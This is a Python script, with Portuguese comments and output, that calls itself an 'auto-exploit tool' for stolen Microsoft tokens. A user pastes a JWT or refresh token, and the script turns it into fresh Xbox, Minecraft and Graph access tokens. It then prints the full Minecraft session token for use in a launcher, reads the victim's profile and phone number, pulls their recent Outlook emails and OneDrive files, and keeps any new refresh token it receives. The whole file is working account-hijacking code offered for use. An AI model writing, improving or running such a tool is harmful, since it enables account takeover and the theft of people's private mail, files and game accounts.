"""
================================================================================
MS UNIVERSAL AUTO-EXPLOIT TOOL
================================================================================
Cole qualquer token (JWT ou Refresh Token M.R3_B...) e essa ferramenta
automaticamente descobre o que ele abre e invade tudo que conseguir.

Uso:
  python ms_universal_login.py

Depois eh so colar o token quando pedir.
================================================================================
"""

import requests
import json
import base64
import requests
import json
import base64
import sys
import time
import os

# Ativar cores no Windows CMD
os.system("")

# CORES DO TERMINAL
class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    W = "\033[97m"
    D = "\033[90m"
    X = "\033[0m"

def banner():
    print(f"""{C.M}
    ======================================================
      MS UNIVERSAL AUTO-EXPLOIT TOOL
      Cole o token e eu faco o resto.
    ======================================================{C.X}
    """)

def sep(title=""):
    if title:
        print(f"\n{C.B}{'='*50}")
        print(f"  {title}")
        print(f"{'='*50}{C.X}")
    else:
        print(f"{C.D}{'-'*50}{C.X}")

# DETECTAR TIPO DO TOKEN
def detect_token_type(token):
    token = token.strip()
    if token.startswith("eyJ"):
        return "jwt"
    elif token.startswith("M.") or token.startswith("0."):
        return "refresh"
    else:
        return "unknown"

# DECODIFICAR JWT (sem verificar assinatura)
def decode_jwt(token):
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        payload = parts[1]
        payload += "=" * (4 - len(payload) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except Exception:
        return None

# Client IDs conhecidos da Microsoft
CLIENT_IDS = {
    "xbox":     "00000000402b5328",
    "office":   "d3590ed6-52b3-4102-aeff-aad2292ab01c",
}

SCOPES = {
    "xbox":  "service::user.auth.xboxlive.com::MBI_SSL",
    "graph": "https://graph.microsoft.com/.default offline_access",
}

def exchange_refresh_token(rt, client_id, scope):
    """Troca um Refresh Token por um Access Token."""
    url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
    data = {
        "grant_type": "refresh_token",
        "client_id": client_id,
        "scope": scope,
        "refresh_token": rt,
    }
    try:
        r = requests.post(url, data=data, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

# XBOX LIVE + MINECRAFT LOGIN CHAIN
def xbox_authenticate(ms_access_token):
    url = "https://user.auth.xboxlive.com/user/authenticate"
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    body = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": f"d={ms_access_token}"
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
    }
    try:
        r = requests.post(url, json=body, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def xsts_authorize(xbl_token):
    url = "https://xsts.auth.xboxlive.com/xsts/authorize"
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    body = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbl_token]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    }
    try:
        r = requests.post(url, json=body, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def minecraft_login(uhs, xsts_token):
    url = "https://api.minecraftservices.com/authentication/login_with_xbox"
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    body = {"identityToken": f"XBL3.0 x={uhs};{xsts_token}"}
    try:
        r = requests.post(url, json=body, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def minecraft_profile(mc_token):
    url = "https://api.minecraftservices.com/minecraft/profile"
    headers = {"Authorization": f"Bearer {mc_token}"}
    try:
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def full_minecraft_chain(ms_access_token):
    print(f"  {C.D}[1/4]{C.X} Xbox Live auth...", end=" ")
    xbl = xbox_authenticate(ms_access_token)
    if not xbl:
        print(f"{C.R}FALHOU{C.X}")
        return None
    xbl_token = xbl.get("Token")
    print(f"{C.G}OK{C.X}")

    print(f"  {C.D}[2/4]{C.X} XSTS authorize...", end=" ")
    xsts = xsts_authorize(xbl_token)
    if not xsts:
        print(f"{C.R}FALHOU{C.X}")
        return None
    xsts_token = xsts.get("Token")
    uhs = xsts["DisplayClaims"]["xui"][0]["uhs"]
    gtag = xsts["DisplayClaims"]["xui"][0].get("gtg", "N/A")
    xid = xsts["DisplayClaims"]["xui"][0].get("xid", "N/A")
    print(f"{C.G}OK{C.X}")

    print(f"  {C.D}[3/4]{C.X} Minecraft login...", end=" ")
    mc = minecraft_login(uhs, xsts_token)
    if not mc:
        print(f"{C.R}FALHOU (sem jogo comprado?){C.X}")
        return {"xbox_uhs": uhs, "xbox_gtag": gtag, "xbox_xid": xid, "mc": None}
    mc_token = mc.get("access_token")
    print(f"{C.G}OK{C.X}")

    print(f"  {C.D}[4/4]{C.X} Minecraft profile...", end=" ")
    profile = minecraft_profile(mc_token)
    if profile:
        print(f"{C.G}OK{C.X}")
    else:
        print(f"{C.Y}sem perfil{C.X}")

    return {
        "xbox_uhs": uhs, "xbox_gtag": gtag, "xbox_xid": xid,
        "mc_token": mc_token, "mc_profile": profile,
    }

# MICROSOFT GRAPH API
def graph_me(access_token):
    url = "https://graph.microsoft.com/v1.0/me"
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None

def graph_emails(access_token, count=5):
    url = f"https://graph.microsoft.com/v1.0/me/messages?$top={count}&$select=subject,from,receivedDateTime,bodyPreview"
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json().get("value", [])
    except Exception:
        pass
    return None

def graph_onedrive(access_token):
    url = "https://graph.microsoft.com/v1.0/me/drive/recent?$top=10"
    headers = {"Authorization": f"Bearer {access_token}"}
    try:
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code == 200:
            return r.json().get("value", [])
    except Exception:
        pass
    return None

# PRINTS
def print_xbox_mc(result):
    sep("XBOX LIVE")
    print(f"  {C.W}Gamertag  :{C.X} {C.G}{result.get('xbox_gtag', 'N/A')}{C.X}")
    print(f"  {C.W}Xbox UID  :{C.X} {result.get('xbox_xid', 'N/A')}")
    print(f"  {C.W}User Hash :{C.X} {result.get('xbox_uhs', 'N/A')}")

    if result.get("mc_profile"):
        p = result["mc_profile"]
        sep("MINECRAFT")
        print(f"  {C.G}TEM O JOGO!{C.X}")
        print(f"  {C.W}Nickname  :{C.X} {C.G}{p.get('name', 'N/A')}{C.X}")
        print(f"  {C.W}UUID      :{C.X} {p.get('id', 'N/A')}")
        if result.get("mc_token"):
            tok = result["mc_token"]
            print(f"  {C.W}MC Token  :{C.X} {C.Y}{tok[:60]}...{C.X}")
            print(f"\n  {C.M}Token completo (copie e use no launcher):{C.X}")
            print(f"  {tok}")
    elif result.get("mc") is None and result.get("xbox_gtag"):
        sep("MINECRAFT")
        print(f"  {C.R}NAO TEM O JOGO COMPRADO (mas tem Xbox){C.X}")

def print_graph_profile(profile):
    sep("CONTA MICROSOFT")
    print(f"  {C.W}Nome      :{C.X} {C.G}{profile.get('displayName', 'N/A')}{C.X}")
    print(f"  {C.W}Email     :{C.X} {profile.get('mail', profile.get('userPrincipalName', 'N/A'))}")
    print(f"  {C.W}ID        :{C.X} {profile.get('id', 'N/A')}")
    phone = profile.get("mobilePhone", "N/A")
    if phone:
        print(f"  {C.W}Telefone  :{C.X} {C.Y}{phone}{C.X}")

def print_emails(emails):
    if not emails:
        return
    sep("ULTIMOS EMAILS (OUTLOOK)")
    for i, e in enumerate(emails, 1):
        sender = e.get("from", {}).get("emailAddress", {}).get("address", "?")
        subj = e.get("subject", "(sem assunto)")
        date = e.get("receivedDateTime", "?")[:16]
        preview = e.get("bodyPreview", "")[:80]
        print(f"  {C.D}[{i}]{C.X} {C.W}{subj}{C.X}")
        print(f"      De: {sender} | {date}")
        if preview:
            print(f"      {C.D}{preview}...{C.X}")
        print()

def print_onedrive(files):
    if not files:
        return
    sep("ONEDRIVE (ARQUIVOS RECENTES)")
    for i, f in enumerate(files, 1):
        name = f.get("name", "?")
        size = f.get("size", 0)
        url = f.get("webUrl", "")
        size_str = f"{size / 1024:.1f} KB" if size < 1048576 else f"{size / 1048576:.1f} MB"
        print(f"  {C.D}[{i}]{C.X} {C.W}{name}{C.X} ({size_str})")
        if url:
            print(f"      {C.B}{url}{C.X}")

# FLUXO JWT
def handle_jwt(token):
    payload = decode_jwt(token)
    if not payload:
        print(f"{C.R}Nao consegui decodificar o JWT.{C.X}")
        return

    aud = payload.get("aud", "")
    name = payload.get("name", "N/A")
    email = payload.get("preferred_username", payload.get("email", "N/A"))
    exp = payload.get("exp", 0)

    sep("JWT DETECTADO")
    print(f"  {C.W}Nome      :{C.X} {C.G}{name}{C.X}")
    print(f"  {C.W}Email     :{C.X} {email}")
    print(f"  {C.W}Audience  :{C.X} {aud}")

    if exp:
        remaining = exp - int(time.time())
        if remaining > 0:
            mins = remaining // 60
            print(f"  {C.W}Expira em :{C.X} {C.Y}{mins} minutos{C.X}")
        else:
            print(f"  {C.W}Status    :{C.X} {C.R}EXPIRADO (faz {abs(remaining)//60} min){C.X}")
            print(f"\n  {C.R}Esse token ja morreu. Precisa de um novo.{C.X}")
            return

    success = False

    # Tentar Graph API
    sep("TESTANDO MICROSOFT GRAPH API")
    print(f"  {C.D}Tentando acessar perfil...{C.X}", end=" ")
    profile = graph_me(token)
    if profile:
        success = True
        print(f"{C.G}ACESSO!{C.X}")
        print_graph_profile(profile)

        print(f"\n  {C.D}Puxando emails...{C.X}", end=" ")
        emails = graph_emails(token)
        if emails:
            print(f"{C.G}{len(emails)} emails{C.X}")
            print_emails(emails)
        else:
            print(f"{C.Y}sem acesso ao Outlook{C.X}")

        print(f"  {C.D}Puxando OneDrive...{C.X}", end=" ")
        files = graph_onedrive(token)
        if files:
            print(f"{C.G}{len(files)} arquivos{C.X}")
            print_onedrive(files)
        else:
            print(f"{C.Y}sem acesso ao OneDrive{C.X}")
    else:
        print(f"{C.Y}sem acesso direto (token nao e do Graph){C.X}")

    # Tentar Xbox/Minecraft
    sep("TESTANDO XBOX LIVE + MINECRAFT")
    result = full_minecraft_chain(token)
    if result:
        success = True
        print_xbox_mc(result)
        
    return success

# FLUXO REFRESH TOKEN
def handle_refresh_token(rt):
    sep("REFRESH TOKEN DETECTADO")
    print(f"  {C.G}Esse e o token mestre! Vou gerar Access Tokens pra tudo.{C.X}")

    success = False
    
    # 1. Xbox/Minecraft
    sep("GERANDO TOKEN XBOX")
    print(f"  {C.D}Trocando RT por MSA Access Token (Xbox scope)...{C.X}", end=" ")
    xbox_resp = exchange_refresh_token(rt, CLIENT_IDS["xbox"], SCOPES["xbox"])
    if xbox_resp and xbox_resp.get("access_token"):
        success = True
        print(f"{C.G}OK{C.X}")
        ms_at = xbox_resp["access_token"]
        result = full_minecraft_chain(ms_at)
        if result:
            print_xbox_mc(result)
    else:
        print(f"{C.R}FALHOU{C.X}")

    # 2. Microsoft Graph
    sep("GERANDO TOKEN GRAPH API")
    print(f"  {C.D}Trocando RT por MSA Access Token (Graph scope)...{C.X}", end=" ")
    graph_resp = exchange_refresh_token(rt, CLIENT_IDS["office"], SCOPES["graph"])
    if graph_resp and graph_resp.get("access_token"):
        success = True
        print(f"{C.G}OK{C.X}")
        g_at = graph_resp["access_token"]

        profile = graph_me(g_at)
        if profile:
            print_graph_profile(profile)

        emails = graph_emails(g_at)
        if emails:
            print_emails(emails)

        files = graph_onedrive(g_at)
        if files:
            print_onedrive(files)
    else:
        print(f"{C.R}FALHOU (token pode ser so do Xbox){C.X}")

    # 3. Novo Refresh Token
    new_rt = None
    if xbox_resp and xbox_resp.get("refresh_token"):
        new_rt = xbox_resp["refresh_token"]
    elif graph_resp and graph_resp.get("refresh_token"):
        new_rt = graph_resp["refresh_token"]

    if new_rt:
        sep("NOVO REFRESH TOKEN")
        print(f"  {C.G}A Microsoft devolveu um RT novo! Guarde esse:{C.X}")
        print(f"  {C.Y}{new_rt}{C.X}")
        print(f"\n  {C.D}(use esse novo da proxima vez, o antigo pode ter sido invalidado){C.X}")

    return success

# MAIN
if __name__ == "__main__":
    banner()

    while True:
        print(f"\n{C.B}{'='*60}{C.X}")
        token = input(f"  {C.W}Cole o Token (JWT ou Refresh Token) [ou 'q' para sair]:{C.X}\n  > ").strip()

        if token.lower() in ['q', 'quit', 'exit']:
            break
        if not token:
            continue

        ttype = detect_token_type(token)
        success = False

        if ttype == "jwt":
            print(f"\n  {C.B}Tipo detectado: JWT Access Token{C.X}")
            success = handle_jwt(token)
        elif ttype == "refresh":
            print(f"\n  {C.B}Tipo detectado: Refresh Token (MSA){C.X}")
            success = handle_refresh_token(token)
        else:
            print(f"\n  {C.R}Token nao reconhecido. Deve comecar com 'eyJ' (JWT) ou 'M.' (Refresh Token){C.X}")
            continue

        sep()
        if success:
            ans = input(f"\n  {C.G}Sucesso total! Deseja testar outro token? (s/n):{C.X} ").strip().lower()
            if ans == 'n':
                break
        else:
            print(f"\n  {C.R}Esse token falhou em todas as rotas uteis. Tente colar OUTRO token.{C.X}")
            time.sleep(1)
            
    print(f"\n  {C.M}Saindo... Feito.{C.X}")
